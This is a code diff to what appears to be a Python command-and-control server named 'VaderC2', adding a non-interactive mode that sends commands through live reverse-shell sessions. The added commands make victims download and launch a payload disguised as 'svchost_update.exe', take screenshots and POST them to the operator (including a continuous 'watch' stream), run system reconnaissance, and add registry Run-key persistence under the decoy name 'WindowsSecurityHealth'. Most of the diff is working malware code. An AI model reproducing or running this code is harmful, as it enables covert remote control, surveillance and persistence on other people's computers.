@@ -917,14 +917,206 @@ setInterval(()=>{{document.getElementById('s').src='latest.png?t='+Date.now()}},
         print(f"  {MUTED}[*] Log: {self.log_path}{RST}")
 
 
+def run_tcp_cmd(tcp_cmd_str):
+    """Execute a single TCP shortcut command non-interactively, then exit."""
+    env_path = None
+    for i, arg in enumerate(sys.argv):
+        if arg == "--env" and i + 1 < len(sys.argv):
+            env_path = sys.argv[i + 1]
+
+    load_env(env_path)
+
+    webhook = os.environ.get("DISCORD_C2_WEBHOOK", "")
+    token = os.environ.get("DISCORD_BOT_TOKEN", "")
+    channel = os.environ.get("DISCORD_C2_CHANNEL", "")
+
+    c2 = VaderC2(webhook, token, channel, LISTEN_PORT)
+
+    c2.start_listener()
+    print(f"  {GREEN}[*] TCP listener active on port {c2.port}{RST}")
+
+    c2.poll_thread = threading.Thread(target=c2.poll_loop, daemon=True)
+    c2.poll_thread.start()
+
+    messages = c2.read_channel(limit=20)
+    if messages:
+        c2.parse_messages(messages)
+
+    time.sleep(2)
+
+    tcp_sessions = [sid for sid, s in c2.sessions.items() if s.channel == "tcp" and s.alive]
+    if not tcp_sessions:
+        print(f"  {RED}[!] No TCP session found. Connect a shell first.{RST}")
+        c2.running = False
+        return
+
+    parts = tcp_cmd_str.strip().split()
+    cmd = parts[0].lower()
+    args = parts[1:]
+
+    sid = tcp_sessions[0]
+    s = c2.sessions[sid]
+    print(f"  {GREEN}[+] Using session {sid[:8]} for TCP command: {tcp_cmd_str}{RST}")
+
+    try:
+        _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        _s.connect(("8.8.8.8", 80))
+        my_ip = _s.getsockname()[0]
+        _s.close()
+    except Exception:
+        my_ip = "192.168.1.92"
+
+    if cmd == "deploy":
+        deploy_cmd = (
+            f'taskkill /F /IM svchost_update.exe 2>nul & '
+            f'powershell -c "Invoke-WebRequest -Uri \'http://{my_ip}:8890/agent/dist_py/svchost_update.exe\' '
+            f'-OutFile \'C:\\Users\\Public\\svchost_update.exe\'; '
+            f'Start-Process \'C:\\Users\\Public\\svchost_update.exe\'"'
+        )
+        s.sock.sendall((deploy_cmd + "\n").encode("utf-8"))
+        print(f"  {GREEN}[+] Deploy command sent.{RST}")
+
+    elif cmd == "screenshot":
+        recv_port = 8891
+        ts = int(time.time())
+        ss_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "screenshots")
+        os.makedirs(ss_dir, exist_ok=True)
+        out_path = os.path.join(ss_dir, f"radon_{ts}.png")
+
+        received = threading.Event()
+        def _recv():
+            from http.server import HTTPServer, BaseHTTPRequestHandler
+            class H(BaseHTTPRequestHandler):
+                def do_POST(self_h):
+                    length = int(self_h.headers.get("Content-Length", 0))
+                    data = self_h.rfile.read(length)
+                    with open(out_path, "wb") as f:
+                        f.write(data)
+                    self_h.send_response(200)
+                    self_h.end_headers()
+                    self_h.wfile.write(b"OK")
+                    received.set()
+                def log_message(self_h, *a):
+                    pass
+            srv = HTTPServer(("0.0.0.0", recv_port), H)
+            srv.timeout = 30
+            srv.handle_request()
+            srv.server_close()
+
+        threading.Thread(target=_recv, daemon=True).start()
+        shot_cmd = (
+            'powershell -c "Add-Type -AssemblyName System.Windows.Forms; '
+            '$bmp = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, '
+            '[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); '
+            '$g = [System.Drawing.Graphics]::FromImage($bmp); '
+            '$g.CopyFromScreen(0,0,0,0,$bmp.Size); '
+            '$bmp.Save(\'C:\\Users\\Public\\screen.png\'); '
+            '$g.Dispose(); $bmp.Dispose(); '
+            f'Invoke-WebRequest -Uri \'http://{my_ip}:{recv_port}/screen.png\' '
+            '-Method POST -InFile \'C:\\Users\\Public\\screen.png\' '
+            '-ContentType \'application/octet-stream\'"'
+        )
+        s.sock.sendall((shot_cmd + "\n").encode("utf-8"))
+        received.wait(timeout=30)
+        if received.is_set() and os.path.exists(out_path):
+            print(f"  {GREEN}[+] Screenshot saved: {out_path} ({os.path.getsize(out_path):,} bytes){RST}")
+        else:
+            print(f"  {AMBER}[*] Screenshot command sent — file didn't arrive in 30s{RST}")
+
+    elif cmd == "watch":
+        interval = int(args[0]) if args and args[0].isdigit() else 5
+        recv_port = 8891
+        ss_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "screenshots")
+        os.makedirs(ss_dir, exist_ok=True)
+        latest_path = os.path.join(ss_dir, "latest.png")
+
+        from http.server import HTTPServer, BaseHTTPRequestHandler
+        class SH(BaseHTTPRequestHandler):
+            def do_POST(self_h):
+                length = int(self_h.headers.get("Content-Length", 0))
+                data = self_h.rfile.read(length)
+                with open(latest_path, "wb") as f:
+                    f.write(data)
+                self_h.send_response(200)
+                self_h.end_headers()
+                self_h.wfile.write(b"OK")
+            def log_message(self_h, *a):
+                pass
+
+        srv = HTTPServer(("0.0.0.0", recv_port), SH)
+        srv.timeout = interval + 10
+
+        shot_cmd = (
+            'powershell -c "Add-Type -AssemblyName System.Windows.Forms; '
+            '$bmp = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, '
+            '[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); '
+            '$g = [System.Drawing.Graphics]::FromImage($bmp); '
+            '$g.CopyFromScreen(0,0,0,0,$bmp.Size); '
+            '$bmp.Save(\'C:\\Users\\Public\\screen.png\'); '
+            '$g.Dispose(); $bmp.Dispose(); '
+            f'Invoke-WebRequest -Uri \'http://{my_ip}:{recv_port}/screen.png\' '
+            '-Method POST -InFile \'C:\\Users\\Public\\screen.png\' '
+            '-ContentType \'application/octet-stream\'"'
+        )
+        frame = 0
+        try:
+            while True:
+                s.sock.sendall((shot_cmd + "\n").encode("utf-8"))
+                srv.handle_request()
+                frame += 1
+                print(f"  [{frame}] streaming...")
+                time.sleep(interval)
+        except KeyboardInterrupt:
+            print(f"  {AMBER}[*] Watch stopped — {frame} frames{RST}")
+        finally:
+            srv.server_close()
+
+    elif cmd == "recon":
+        recon_cmd = "systeminfo & ipconfig /all & whoami /all & tasklist /v"
+        s.sock.sendall((recon_cmd + "\n").encode("utf-8"))
+        print(f"  {GREEN}[+] Recon command sent.{RST}")
+        time.sleep(10)
+
+    elif cmd == "persist":
+        persist_cmd = (
+            'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
+            '/v WindowsSecurityHealth /t REG_SZ '
+            '/d "C:\\Users\\Public\\svchost_update.exe" /f'
+        )
+        s.sock.sendall((persist_cmd + "\n").encode("utf-8"))
+        print(f"  {GREEN}[+] Persistence command sent.{RST}")
+
+    elif cmd == "kill":
+        proc = args[0] if args else ""
+        if not proc:
+            print(f"  {RED}[!] No process name given.{RST}")
+        else:
+            s.sock.sendall((f"taskkill /F /IM {proc}\n").encode("utf-8"))
+            print(f"  {GREEN}[+] Kill command sent: {proc}{RST}")
+
+    else:
+        print(f"  {RED}[!] Unknown TCP command: {cmd}{RST}")
+
+    c2.running = False
+    if c2.listener_sock:
+        c2.listener_sock.close()
+
+
 def main():
     env_path = None
     port = LISTEN_PORT
+    tcp_cmd = None
     for i, arg in enumerate(sys.argv):
         if arg == "--env" and i + 1 < len(sys.argv):
             env_path = sys.argv[i + 1]
         if arg == "--port" and i + 1 < len(sys.argv):
             port = int(sys.argv[i + 1])
+        if arg == "--tcp-cmd" and i + 1 < len(sys.argv):
+            tcp_cmd = sys.argv[i + 1]
+
+    if tcp_cmd:
+        run_tcp_cmd(tcp_cmd)
+        return
 
     load_env(env_path)
 
